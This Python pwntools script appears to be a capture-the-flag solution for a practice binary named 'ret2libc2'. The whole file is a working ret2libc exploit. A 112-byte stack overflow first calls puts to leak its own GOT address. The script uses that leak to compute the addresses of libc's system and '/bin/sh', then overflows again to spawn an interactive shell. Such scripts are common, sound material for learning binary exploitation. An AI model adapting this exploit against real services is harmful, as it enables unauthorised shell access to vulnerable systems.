#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

elf = ELF("./ret2libc2")
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
#  main_elf = elf.symbols["main"]
start_elf = elf.symbols["_start"]

libc = ELF("/lib/i386-linux-gnu/libc.so.6")
sys_libc = libc.symbols["system"]
sh_libc = libc.search("/bin/sh").next()
puts_libc = libc.symbols["puts"]

io = process("./ret2libc2")
#puts(puts_got) -> start_elf
payload = flat(['a' * 112, puts_plt, start_elf, puts_got])
io.sendlineafter("!?", payload)

puts_addr = u32(io.recv(4))
sys_addr = puts_addr - puts_libc + sys_libc
sh_addr = puts_addr - puts_libc + sh_libc

payload = flat(['a' * 112, sys_addr, 0xdeadbeef, sh_addr])
io.sendlineafter("!?", payload)

io.interactive()
io.close()
